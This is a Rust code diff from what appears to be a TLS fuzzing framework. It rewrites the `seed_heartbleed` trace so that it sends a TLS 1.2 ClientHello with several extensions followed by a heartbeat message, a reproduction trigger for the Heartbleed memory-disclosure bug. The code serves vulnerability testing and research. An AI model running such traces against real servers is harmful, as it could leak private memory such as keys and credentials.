@@ -16,6 +16,7 @@ use crate::{
     trace::{Action, InputAction, OutputAction, Step, Trace},
 };
 use crate::{app, app_const, term, var};
+use rustls::internal::msgs::message::OpaqueMessage;
 
 pub fn seed_successful(client: AgentName, server: AgentName) -> Trace {
     Trace {
@@ -666,39 +667,68 @@ pub fn seed_cve_2021_3449(client: AgentName, server: AgentName) -> Trace {
     trace
 }
 
+
 pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace {
-    let (mut trace, _) = _seed_client_attacker12(client, server);
+    let client_hello = app!(
+        fn_client_hello,
+        app_const!(fn_protocol_version12),
+        app_const!(fn_new_random),
+        app_const!(fn_new_session_id),
+        // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+        app_const!(fn_new_cipher_suites12),
+        app_const!(fn_compressions),
+            app!(
+                fn_client_extensions_append,
+                app!(
+                    fn_client_extensions_append,
+                    app!(
+                        fn_client_extensions_append,
+                        app!(
+                            fn_client_extensions_append,
+                            app!(
+                                fn_client_extensions_append,
+                                app_const!(fn_client_extensions_new),
+                                app_const!(fn_SECP384R1_support_group_extension),
+                            ),
+                            app_const!(fn_signature_algorithm_extension)
+                        ),
+                        app_const!(fn_ec_point_formats_extension)
+                    ),
+                    app_const!(fn_signature_algorithm_cert_extension)
+                ),
+                app_const!(fn_signed_certificate_timestamp)
+            )
+    );
 
-    let hearbeat = term! {
-        fn_heartbeat
+
+    let trace = Trace {
+        descriptors: vec![
+            AgentDescriptor {
+                name: client,
+                tls_version: TLSVersion::V1_2,
+                server: false,
+            },
+            AgentDescriptor {
+                name: server,
+                tls_version: TLSVersion::V1_2,
+                server: true,
+            },
+        ],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: client_hello,
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: app_const!(fn_heartbeat),
+                }),
+            }
+        ],
     };
-
-/*    trace.steps.push(Step {
-        agent: server,
-        action: Action::Input(InputAction {
-            recipe: hearbeat,
-        }),
-    });*/
-    trace.steps.push(Step {
-        agent: server,
-        action: Action::Output(OutputAction { id: 9 }),
-    });
-    trace.steps.push(Step {
-        agent: server,
-        action: Action::Input(InputAction {
-            recipe: app!(
-                fn_encrypt12,
-                hearbeat.clone(),
-                var!(Random, (0, 0)),
-                app!(fn_decode_ecdh_params, var!(Vec<u8>, (0, 2))), // ServerECDHParams
-                app_const!(fn_seq_1)
-            ),
-        }),
-    });
-    trace.steps.push(Step {
-        agent: server,
-        action: Action::Output(OutputAction { id: 10 }),
-    });
 
     trace
 }
